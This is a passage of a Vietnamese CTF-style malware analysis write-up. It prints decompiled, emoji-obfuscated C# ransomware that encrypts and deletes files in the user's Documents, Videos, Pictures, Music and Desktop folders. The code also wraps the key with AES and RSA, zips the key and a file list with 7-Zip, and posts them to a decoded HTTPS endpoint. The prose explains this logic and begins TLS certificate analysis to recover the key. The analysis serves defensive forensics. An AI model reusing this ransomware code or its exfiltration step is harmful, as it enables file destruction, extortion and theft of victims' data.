JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH.PostAsync(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;9\ufe0f\u20e3\ud83c\ude51\ud83d\uddff\ud83c\udf7a\ud83d\udcd3\ud83c\ude51\ud83d\udc36\ud83d\udd3c\ud83d\udc9c\ud83c\udf46\ud83c\udfa5‚úí\ufe0f\ud83d\udc60\ud83d\udd28\ud83d\udc9b\ud83d\udeb4\ud83d\udc36\ud83d\udd28\ud83c\ude01\ud83c\ude3a\ud83d\udc9c\ud83c\udfa9\ud83d\udc9b\ud83c\udf7a\ud83c\udf8f\ud83d\udcac\ud83c\ude3a‚úí\ufe0f\ud83d\udc36\ud83c\udfa9\ud83c\udf63\ud83d\udd3c\ud83c\udf8f\ud83c\udfad\ud83c\udf75\ud83c\udf67\ud83d\udc36\ud83c\udf46\ud83c\udfa5\ud83d\udd0c&quot;), YIYcePSZHvUeSMhUzZwoVHmOV);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static byte gbTxSBXvOnHlWXYrw(byte b, int rounds)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int i = 0; i &lt; rounds; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			b = (byte)((uint)((b ^ 0xA5) + 37) &amp; 0xFFu);</span><br><span class="line">		&#125;</span><br><span class="line">		return b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static byte[] TxWVCaCGswNFFkFNyyuGYebzTnmKMI(byte[] plaintext, byte[] key, int rounds = 3)</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] array = new byte[plaintext.Length];</span><br><span class="line">		int num = key.Length;</span><br><span class="line">		for (int i = 0; i &lt; plaintext.Length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			byte b = gbTxSBXvOnHlWXYrw(key[i % num], rounds);</span><br><span class="line">			array[i] = (byte)(plaintext[i] ^ b);</span><br><span class="line">		&#125;</span><br><span class="line">		return array;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static int[] OVixtxAlZgODrcwOVgagxeWAk()</span><br><span class="line">	&#123;</span><br><span class="line">		int[] array = new int[256];</span><br><span class="line">		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();</span><br><span class="line">		byte[] array2 = new byte[1024];</span><br><span class="line">		rNGCryptoServiceProvider.GetBytes(array2);</span><br><span class="line">		Buffer.BlockCopy(array2, 0, array, 0, array2.Length);</span><br><span class="line">		return array;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static byte[] qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(string input)</span><br><span class="line">	&#123;</span><br><span class="line">		using SHA256 sHA = SHA256.Create();</span><br><span class="line">		return sHA.ComputeHash(Encoding.UTF8.GetBytes(input));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static byte[] lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(byte[] data, out byte[] key, out byte[] iv)</span><br><span class="line">	&#123;</span><br><span class="line">		using Aes aes = Aes.Create();</span><br><span class="line">		aes.Mode = CipherMode.CBC;</span><br><span class="line">		aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">		byte[] src = qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83c\ude01‚Ñπ\ufe0f‚õµ\ud83d\udc9a‚è©\ud83d\udc7b\ud83d\udd0e\ud83c\udf7a\ud83d\udc23‚Ñπ\ufe0f‚õµ\ud83c\udf7b\ud83d\udc58‚Ñπ\ufe0f\ud83d\udcaf\ud83d\ude82‚è©‚Ñπ\ufe0f\ud83d\ude82\ud83c\udf46\ud83c\ude01\ud83d\udcc9\ud83d\uddff\ud83d\udeb49\ufe0f\u20e3\ud83d\udc7b\ud83d\udc5e\ud83d\udc5e\ud83d\udc23\ud83c\udf75\ud83d\udd0c\ud83d\udd0c&quot;));</span><br><span class="line">		key = new byte[32];</span><br><span class="line">		iv = new byte[16];</span><br><span class="line">		Buffer.BlockCopy(src, 0, key, 0, 32);</span><br><span class="line">		Buffer.BlockCopy(src, 16, iv, 0, 16);</span><br><span class="line">		using ICryptoTransform cryptoTransform = aes.CreateEncryptor(key, iv);</span><br><span class="line">		return cryptoTransform.TransformFinalBlock(data, 0, data.Length);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static byte[] ddAxJkAciSG(byte[] data, string publicKey)</span><br><span class="line">	&#123;</span><br><span class="line">		using RSA rSA = RSA.Create();</span><br><span class="line">		rSA.ImportSubjectPublicKeyInfo(Convert.FromBase64String(publicKey), out var _);</span><br><span class="line">		return rSA.Encrypt(data, RSAEncryptionPadding.OaepSHA256);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static string eOUFdPmHAHcqPJQRyafSXBf(int length)</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] array = new byte[length];</span><br><span class="line">		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();</span><br><span class="line">		rNGCryptoServiceProvider.GetBytes(array);</span><br><span class="line">		StringBuilder stringBuilder = new StringBuilder(length);</span><br><span class="line">		byte[] array2 = array;</span><br><span class="line">		foreach (byte b in array2)</span><br><span class="line">		&#123;</span><br><span class="line">			stringBuilder.Append(&quot;KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz&quot;[b % &quot;KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz&quot;.Length]);</span><br><span class="line">		&#125;</span><br><span class="line">		return stringBuilder.ToString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static void eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(string[] dirs, string pubKey)</span><br><span class="line">	&#123;</span><br><span class="line">		ISAAC iSAAC = new ISAAC(OVixtxAlZgODrcwOVgagxeWAk());</span><br><span class="line">		byte[] array = new byte[32];</span><br><span class="line">		for (int i = 0; i &lt; array.Length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			array[i] = (byte)iSAAC.Next();</span><br><span class="line">		&#125;</span><br><span class="line">		byte[] key;</span><br><span class="line">		byte[] iv;</span><br><span class="line">		byte[] bytes = ddAxJkAciSG(lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(array, out key, out iv).Concat(key).Concat(iv).ToArray(), pubKey);</span><br><span class="line">		string text = Path.Combine(Path.GetTempPath(), NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udd01‚Ñπ\ufe0f\ud83d\udd0e\ud83c\udf87\ud83c\ude01‚öΩ\ud83c\udd7f\ufe0f\ud83d\ude8f‚è©\ud83c\udf7b\ud83d\uddff\ud83c\udf6f&quot;) + Guid.NewGuid());</span><br><span class="line">		Directory.CreateDirectory(text);</span><br><span class="line">		File.WriteAllBytes(Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;9\ufe0f\u20e3\ud83d\udc0f\ud83d\udc5e\ud83c\udf7a\ud83c\ude01\ud83d\udeb9‚õµ\ud83d\udc88‚è©\ud83d\udcc9\ud83c\udf63\ud83d\udd0c&quot;)), bytes);</span><br><span class="line">		List&lt;string&gt; list = new List&lt;string&gt;();</span><br><span class="line">		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);</span><br><span class="line">		foreach (string path in dirs)</span><br><span class="line">		&#123;</span><br><span class="line">			string path2 = Path.Combine(folderPath, path);</span><br><span class="line">			if (!Directory.Exists(path2))</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			string[] files = Directory.GetFiles(path2);</span><br><span class="line">			foreach (string text2 in files)</span><br><span class="line">			&#123;</span><br><span class="line">				list.Add(text2);</span><br><span class="line">				try</span><br><span class="line">				&#123;</span><br><span class="line">					byte[] bytes2 = TxWVCaCGswNFFkFNyyuGYebzTnmKMI(File.ReadAllBytes(text2), array);</span><br><span class="line">					string text3 = eOUFdPmHAHcqPJQRyafSXBf(20);</span><br><span class="line">					File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(text2), text3 + NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udc9c\ud83c\udf63\ud83d\udcaf\ud83d\udc9b\ud83c\udf75\ud83d\udc8f\ud83d\udd0c\ud83d\udd0c&quot;)), bytes2);</span><br><span class="line">					File.Delete(text2);</span><br><span class="line">					Thread.Sleep(500);</span><br><span class="line">				&#125;</span><br><span class="line">				catch</span><br><span class="line">				&#123;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		File.WriteAllLines(Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udd01‚öΩ\ud83c\udd7f\ufe0f\ud83c\udf87‚è©\ud83d\udc0f\ud83d\udc5e\ud83d\udeb4\ud83c\ude01‚Ñπ\ufe0f‚úí\ufe0f\ud83c\udf6f‚è©\ud83d\udd38\ud83d\udc5e\ud83c\udfc8‚è©\ud83d\udcc9\ud83d\udc36\ud83d\udeb4\ud83d\udc23\ud83c\ude51\ud83d\ude8f\ud83c\udf7a&quot;)), list, Encoding.UTF8);</span><br><span class="line">		string text4 = Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udcd3\ud83d\udc7b\ud83d\udd0e\ud83c\udfa99\ufe0f\u20e3\ud83d\udc0f\ud83d\udd0e\ud83c\udf7b‚è©\ud83d\udeb9\ud83c\ude3a‚öΩ\ud83d\udc58\ud83d\udcbb\ud83d\udd0c\ud83d\udd0c&quot;));</span><br><span class="line">		string[] files2 = Directory.GetFiles(text);</span><br><span class="line">		lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(text4, files2);</span><br><span class="line">		hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(text4).Wait();</span><br><span class="line">		Thread.Sleep(5000);</span><br><span class="line">		Directory.Delete(text, recursive: true);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		string pubKey = NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udd28\ud83d\udd1c\ud83d\udc5e\ud83c\udd7f\ufe0f\ud83c\udf75\ud83c\udf63\ud83d\udc5e\ud83d\ude9b\ud83c\udf75\ud83d\udd1c‚õµ\ud83d\udcac‚è©\ud83d\udc0f\ud83d\ude0d‚úí\ufe0f9\ufe0f\u20e3\ud83d\udc7b\ud83d\ude0d\ud83c\udf87\ud83d\uddff\ud83c\udf67\ud83d\udc5e‚öΩ\ud83d\udc36\ud83c\udf06\ud83c\udd7f\ufe0f\ud83c\udf0a\ud83d\udd1c\ud83d\udd1c\ud83d\udcaf\ud83d\udc7b\ud83c\udf75\ud83d\udd1c\ud83d\udd0e\ud83c\udf83\ud83c\udf75\ud83c\udf7a\ud83d\udd0e\ud83d\uddff\ud83d\udc60\ud83c\udf06\ud83d\udd0e\ud83c\udf8f\ud83d\udeb9\ud83d\udd1c\ud83d\udc5e\ud83d\udcac\ud83c\udf75\ud83d\udc0f\ud83d\udc23\ud83d\udc9c\ud83c\udf75\ud83c\udf7a\ud83d\udd0e\ud83d\uddff\ud83d\uddff\ud83d\udd1c\ud83c\udf06\ud83d\udc8f\ud83d\udd28\ud83d\udd38\ud83d\ude8f\ud83d\ude8f\ud83d\udeb9‚Ñπ\ufe0f\ud83d\udc5e‚öΩ\ud83d\uddff\ud83d\udd1c\ud83d\udd0e\ud83d\udcbf\ud83c\ude01\ud83c\udfa9‚è©\ud83d\udcbf\ud83d\udd28\ud83d\udd38\ud83d\ude82‚úí\ufe0f\ud83d\udd1c\ud83d\udd38\ud83c\udf06\ud83d\ude82\ud83d\udd28\ud83d\udc0f‚õµ\ud83c\udf83‚Ñπ\ufe0f\ud83d\udd28‚è©\ud83c\udf0a\ud83d\udd28\ud83c\udf46\ud83d\ude0d\ud83d\udd1c‚è©\ud83c\udfad\ud83c\udd7f\ufe0f\ud83c\ude01\ud83c\udf8f\ud83d\udc0f\ud83d\ude82\ud83c\udf8f‚è©\ud83d\udc0f\ud83d\udc23\ud83c\uddea\ud83c\uddf8\ud83c\ude01\ud83c\udf7a\ud83d\udc5e\ud83c\udfa9\ud83d\udeb9\ud83d\udd1c\ud83c\udf7a\ud83c\ude3a\ud83d\udc9c\ud83d\ude82‚è©\ud83d\udc8b\ud83d\udc23\ud83c\udfa9\ud83d\udd0e\ud83d\udc0f\ud83d\udd01\ud83c\udf7b\ud83d\udcaf\ud83d\ude8f\ud83c\uddea\ud83c\uddf8‚öΩ\ud83d\udc9a\ud83c\udf67\ud83d\udc36\ud83c\udf7a\ud83d\udd1c‚úí\ufe0f‚è©\ud83c\udf63\ud83d\udd0e\ud83d\udcaf\ud83c\ude01\ud83d\ude82\ud83d\uddff\ud83c\udd7f\ufe0f‚è©\ud83d\udcaf\ud83d\uddff\ud83d\udc9b\ud83d\uddff\ud83c\udf06\ud83d\udc5e\ud83c\udf87\ud83d\udd28\ud83d\udcaf\ud83c\udd7f\ufe0f\ud83d\udd28\ud83d\uddff\ud83d\udd28\ud83d\uddff\ud83c\udfad‚è©\ud83c\udf06\ud83c\udf8f\ud83c\udf8f\ud83d\udd1c‚öΩ\ud83c\udf63‚úí\ufe0f\ud83d\uddff\ud83c\udf06\ud83c\udf06\ud83d\udc0f9\ufe0f\u20e3\ud83c\udf7a\ud83d\udcbb\ud83d\udc88\ud83d\udc58\ud83d\udc7b\ud83d\ude8f\ud83d\udc60\ud83c\udf8f\ud83d\ude82\ud83c\udf8f\ud83c\udf67\ud83d\udc60‚Ñπ\ufe0f‚õµ\ud83d\udc9b\ud83d\udd01\ud83d\udc5e\ud83d\uddff\ud83c\udf06\ud83d\uddff\ud83c\udf63‚õµ\ud83d\udc9a\ud83d\udd1c\ud83d\udd38\ud83d\udc23\ud83c\udf83\ud83d\udc58\ud83c\udf7b\ud83d\udcaf\ud83d\ude0d\ud83c\udf8f\ud83d\udc0f\ud83c\ude01\ud83c\udf46\ud83d\udc58\ud83c\udf7b\ud83d\udd0e\ud83c\ude51\ud83d\udeb9\ud83d\udd38\ud83d\udebe‚öΩ\ud83d\uddff\ud83d\udcc9‚è©\ud83d\udc88‚è©\ud83d\udd1c\ud83d\ude0d\ud83d\udc9a\ud83d\udc60\ud83d\udd1c\ud83c\ude3a\ud83d\udc8f\ud83d\udd01\ud83d\udd38\ud83c\udf8f\ud83c\udf67\ud83d\udc23‚Ñπ\ufe0f\ud83d\udc5e\ud83d\ude0d\ud83d\uddff\ud83d\udc7b\ud83c\udf06\ud83c\udf46\ud83c\uddea\ud83c\uddf8\ud83c\udf7a‚úí\ufe0f\ud83d\udc8f\ud83d\udcaf\ud83d\udd1c\ud83d\uddff\ud83d\udd28\ud83d\udd1c\ud83c\ude51\ud83d\udcbb\ud83d\ude82\ud83d\udc36‚öΩ\ud83d\udc23\ud83c\udd7f\ufe0f\ud83d\udeb9\ud83c\udf63\ud83c\udf63\ud83c\udf67\ud83d\udc58\ud83d\udd0e\ud83d\uddff\ud83d\udd28\ud83d\udcaf\ud83c\ude51\ud83d\uddff\ud83c\udf83‚è©\ud83d\udd28\ud83d\uddff\ud83d\udd28‚è©\ud83d\udd1c\ud83c\udd7f\ufe0f\ud83d\udd38\ud83d\udc23\ud83c\udfad\ud83d\udc23\ud83c\udf0a\ud83d\udcd3\ud83c\udf63\ud83c\udf06\ud83d\ude82\ud83d\udc58\ud83d\udc7b\ud83d\udcd3\ud83d\udc0f\ud83d\udcaf\ud83d\udcc9\ud83c\udf87\ud83d\udeb4\ud83d\udc9c\ud83d\ude82\ud83d\udc9a\ud83c\udf7a\ud83c\udf75\ud83d\udcc9\ud83d\ude8f\ud83d\ude82\ud83d\udcaf\ud83c\udfa9\ud83c\ude01\ud83c\udf7a\ud83d\uddff\ud83d\udd1c\ud83c\udd7f\ufe0f\ud83d\udcac\ud83d\udc23\ud83d\udcc9\ud83d\udd0e\ud83d\udc9b\ud83c\uddea\ud83c\uddf8\ud83d\udc0f\ud83d\udd0e\ud83c\udf75\ud83d\udeb9\ud83d\udd28\ud83d\udd1c\ud83c\udf67\ud83d\udcaf\ud83c\udfad\ud83d\uddff\ud83d\udcbf\ud83d\udd1c\ud83d\udd1c\ud83d\udc5e\ud83d\udc88\ud83c\udf8f\ud83c\udf63\ud83d\udd0e\ud83d\udd0e\ud83d\udd28\ud83c\ude51\ud83c\udf0a\ud83d\udd38\ud83c\udf75‚Ñπ\ufe0f\ud83c\ude3a\ud83d\ude82\ud83d\udd01\ud83d\udd28\ud83d\udc9b\ud83c\udf46\ud83c\udf75\ud83d\ude82\ud83d\udc9a\ud83c\udf7a\ud83d\udc60\ud83d\udd0e\ud83d\ude8f‚Ñπ\ufe0f\ud83d\udcd3\ud83d\udc8b\ud83d\ude0d\ud83c\udf87\ud83d\udd28\ud83c\udf46\ud83d\ude0d\ud83d\ude82\ud83c\udf8f\ud83d\udc0f\ud83d\ude8f\ud83c\uddea\ud83c\uddf8\ud83d\udcd3\ud83c\udf06\ud83d\uddff\ud83d\udd28\ud83d\udc23\ud83c\udf63\ud83d\ude82\ud83d\udc9c\ud83d\udcaf\ud83d\udc7b\ud83d\ude82\ud83c\ude51\ud83c\udf8f\ud83c\udf67\ud83d\udc5e‚õµ9\ufe0f\u20e3\ud83c\udfad\ud83d\udc23\ud83c\udf7b\ud83d\udd01‚Ñπ\ufe0f\ud83d\udc23\ud83d\udc7b‚è©‚öΩ\ud83d\udc23\ud83c\udf0a\ud83d\udd28\ud83d\udd1c\ud83d\udc8f‚öΩ\ud83c\ude01\ud83d\ude82\ud83c\udf8f\ud83d\udc9b\ud83d\udeb9\ud83d\udd0e\ud83d\uddff\ud83c\udf8f‚è©\ud83d\udcaf\ud83c\udf0a‚Ñπ\ufe0f9\ufe0f\u20e3\ud83d\udcaf\ud83d\udc5e\ud83d\udcbf9\ufe0f\u20e3\ud83c\udf67\ud83d\udd0e\ud83d\udd28\ud83d\udd1c‚öΩ\ud83d\udcaf\ud83d\udc88\ud83d\udeb9\ud83d\udc7b\ud83d\udcaf\ud83d\udeb9‚è©\ud83c\udf06\ud83d\udcaf\ud83d\ude8f\ud83d\uddff\ud83d\udd38\ud83c\udfc8\ud83c\ude3a\ud83d\udd28\ud83d\udd28‚è©\ud83d\ude8f9\ufe0f\u20e3\ud83d\udd1c\ud83d\udcaf‚úí\ufe0f‚Ñπ\ufe0f‚Ñπ\ufe0f\ud83d\udc36‚öΩ\ud83d\udc9c\ud83c\udf7a\ud83d\udd0e\ud83c\udfa9\ud83d\udcaf\ud83d\ude82\ud83c\udf8f\ud83d\udeb4\ud83d\udeb9\ud83d\udc7b\ud83d\udcaf\ud83c\ude01\ud83d\udcd3\ud83d\udd0e\ud83d\ude8f\ud83c\uddea\ud83c\uddf8\ud83d\udd28\ud83d\udd38‚è©\ud83d\udd0e\ud83d\uddff‚Ñπ\ufe0f\ud83c\udf8f\ud83c\udfad\ud83d\udd28\ud83c\ude51\ud83d\udcaf\ud83c\udfad\ud83d\udcd3\ud83d\udd1c‚õµ\ud83d\ude9b\ud83c\udf8f\ud83d\udc0f‚è©\ud83c\udfa9\ud83d\udcaf\ud83c\udfad\ud83d\udc9b\ud83d\ude82‚è©\ud83d\udc0f\ud83d\ude82\ud83d\udd0e\ud83d\udc23\ud83c\udf7a\ud83d\udcd3\ud83d\ude82\ud83d\udd01\ud83d\udd0e\ud83d\udc5e\ud83c\udfa9‚Ñπ\ufe0f‚Ñπ\ufe0f\ud83c\udf87\ud83d\udc88\ud83c\udf8f\ud83d\udcc9\ud83c\udf87\ud83c\udf7b\ud83d\udd01\ud83d\udd0e\ud83c\udf0a\ud83d\udd38\ud83c\uddea\ud83c\uddf8\ud83d\udc0f\ud83d\ude0d\ud83c\uddea\ud83c\uddf8\ud83d\udc36\ud83d\udd0e\ud83d\udd0e\ud83c\udd7f\ufe0f\ud83d\uddff\ud83c\udf06\ud83d\udd0e\ud83d\uddff\ud83c\udf75\ud83d\udd1c\ud83d\udc9b\ud83d\udd0c&quot;);</span><br><span class="line">		eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(new string[5]</span><br><span class="line">		&#123;</span><br><span class="line">			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\uddff\ud83d\udc7b\ud83d\udebe\ud83c\udfa9\ud83d\udc23‚Ñπ\ufe0f\ud83d\ude82\ud83d\udc5e\ud83d\udd01\ud83c\udf7b\ud83d\uddff\ud83c\udf67&quot;),</span><br><span class="line">			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udcaf\ud83d\udd38\ud83d\udc5e\ud83c\udf63‚è©‚Ñπ\ufe0f\ud83d\udebe\ud83c\udf67&quot;),</span><br><span class="line">			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udd1c\ud83d\udc7b\ud83d\udc5e\ud83c\udfa9\ud83d\udc23\ud83c\ude51\ud83d\udcaf\ud83c\udf46‚è©\ud83d\udcc9\ud83d\udc36\ud83d\udd0c&quot;),</span><br><span class="line">			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udd28\ud83d\udcc9\ud83d\udcaf\ud83c\udf679\ufe0f\u20e3‚Ñπ\ufe0f\ud83d\udc36\ud83d\udd0c&quot;),</span><br><span class="line">			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\uddff\ud83d\udc7b\ud83d\udcaf\ud83c\udf679\ufe0f\u20e3‚öΩ\ud83d\uddff\ud83d\udcbf\ud83d\udcd3\ud83d\udc3d\ud83d\udd0c\ud83d\udd0c&quot;)</span><br><span class="line">		&#125;, pubKey);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static string NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(string java)</span><br><span class="line">	&#123;</span><br><span class="line">		string text = null;</span><br><span class="line">		StringInfo stringInfo = new StringInfo(java);</span><br><span class="line">		for (int i = 0; i &lt; stringInfo.LengthInTextElements; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			string text2 = stringInfo.SubstringByTextElements(i, 1);</span><br><span class="line">			foreach (KeyValuePair&lt;string, string&gt; item in pdZuVvKNPFSscmrJcOBSJjLEW)</span><br><span class="line">			&#123;</span><br><span class="line">				if (item.Value == text2)</span><br><span class="line">				&#123;</span><br><span class="line">					text += item.Key.ToString();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return Encoding.UTF8.GetString(Convert.FromBase64String(text));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng k·ªπ thu·∫≠t m√£ h√≥a emoji v·ªõi m·ªôt c√°i dictionary d√πng mapping v·ªÅ l·∫°i ASCII<br>ƒê√¢y l√† code mapping l·∫°i chu·ªói escape&#x2F;emoji<br><img src="https://hackmd.io/_uploads/HJQm4t-9ll.png" alt="dec_emoji"><br>[+] NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd h√†m ch·ª©c nƒÉng decode escape&#x2F;emoji<br>[+] eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd Main code nh·∫≠n 5 ƒë·ªëi s·ªë l√† c√°c folder nh∆∞ :<br>b‚ÄôDocuments‚Äô,b‚ÄôVideos‚Äô,b‚ÄôPictures‚Äô,b‚ÄôMusic‚Äô,b‚ÄôDesktop‚Äô<br>T√≥m t·∫Øt logic code h√†m Maincode</p>
<p>T·∫°i m·ªôt key d√πng decryption payload ƒë∆∞·ª£c t·∫°o th√¥ng qua ISAASC nh·∫≠n m·ªôt seed t·ª´ return c·ªßa OVixtxAlZgODrcwOVgagxeWAk()<br>m√£ h√≥a key n√†y v·ªõi AES v·ªõi key<em>aes v√† iv_aes (hardcode) xong wapper c·∫£ 3 v√†o r·ªìi l·∫°i m√£ h√≥a v·ªõi RSA<br>l∆∞u data v√†o <strong>kita.key</strong><br>[+] TxWVCaCGswNFFkFNyyuGYebzTnmKMI l√† h√†m gi·∫£i m√£ v·ªõi key ban ƒë·∫ßu ƒë∆∞·ª£c custom v·ªõi rounds &#x3D; 3<br>gi·∫£ m√£ payload xor ƒë∆°n gi·∫£n v·ªõi key custom<br>v√† c√≥ m·ªôt ƒëi·ªÅu ƒë√°ng ch√∫ √Ω l√† attacker ƒë√£ l∆∞u c√°c t√™n file g·ªëc v√† m·ªôt list l∆∞u v√†o <strong>original_files.txt</strong> sau ƒë√≥ ƒë∆∞·ª£c n√©n v·ªõi 7zip ·ªü h√†m<br>[+]lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq : n√©n file v·ªõi 7z<br>[+] hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat : Send file ra ngo√†i<br>T·∫°o folder ‚Äú%TEMP%\maicraft</em><GUID>‚Äú ƒë·ªÉ l∆∞u tr·ªØ files <strong>‚Äúkita.key,original_files.txt‚Äù</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload gi·∫£i m√£ h√†m n√©n</span><br><span class="line">Process.Start(C:\\Program Files\\7-Zip\\7z.exe, &quot;a -t7z -mx5 -parameter-none \&quot;&quot; + package.7z &quot;\&quot; + %TEMP%maicraft_&lt;GUID&gt;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload gi·∫£i m√£ h√†m send</span><br><span class="line">https://192.168.244.129:4433/file</span><br></pre></td></tr></table></figure>

<p>T·ªõi ƒë√¢y ta c√≥ ƒëc IPC2 c≈©ng nh∆∞ file ƒë∆∞·ª£c g·ª≠i<br>Check file pcapng c√≥ trong temp folder wireshark_Ethernet03ZL1B3.pcapng<br>th√¨ th·∫•y c√≥ c√°c connect t·ªõi Ip n√†y nh∆∞ng ƒë√£ b·ªã m√£ h√≥a TLSv1.2 th√¨ TLSv1.2 s·ª≠ d·ª•ng thu·∫≠t to√°n RSA ƒë·ªÉ encrypted packet li·ªáu ta c√≥ th·ªÉ crack ƒë∆∞·ª£c private key t·ª´ publickey kh√¥ng?<br>H√£y th·ª≠ t√¥i s·∫Ω t√¨m Handshake c·ªßa TLS v√† l·∫•y public key t·ª´ Server Hello packet<br>d√πng openssl ƒë·ªÉ ki·ªÉm tra th√¥ng tin cert</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -in ../public.cer -text -noout</span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number:</span><br><span class="line">            a7:13:6c:39:cf:6c:34:61</span><br><span class="line">        Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Jul 22 12:40:09 2025 GMT</span><br><span class="line">            Not After : Jul 22 12:40:09 2026 GMT</span><br><span class="line">        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: rsaEncryption</span><br><span class="line">                Public-Key: (1024 bit)</span><br><span class="line">                Modulus:</span><br><span class="line">                    00:8e:67:9c:2f:5e:44:ff:8f:57:0f:09:ea:a7:ea:</span><br><span class="line">                    76:48:59:61:db:50:c6:d2:b8:86:e6:dd:cc:11:1b:</span><br><span class="line">                    ca:7d:c5:46:8d:f6:be:f7:00:b5:a0:aa:1c:c7:68:</span><br><span class="line">                    0c:16:10:08:90:8e:2b:7c:bd:d9:95:15:13:87:b5:</span><br><span class="line">                    e6:83:52:80:6e:d9:e9:8a:a9:71:dc:3e:ae:88:a9:</span><br><span class="line">                    5b:1b:92:dd:29:72:b1:d7:d1:0a:3e:91:50:c1:00:</span><br><span class="line">                    15:b0:db:6f:86:bd:49:e9:4f:7e:b9:b2:63:8e:0d:</span><br><span class="line">                    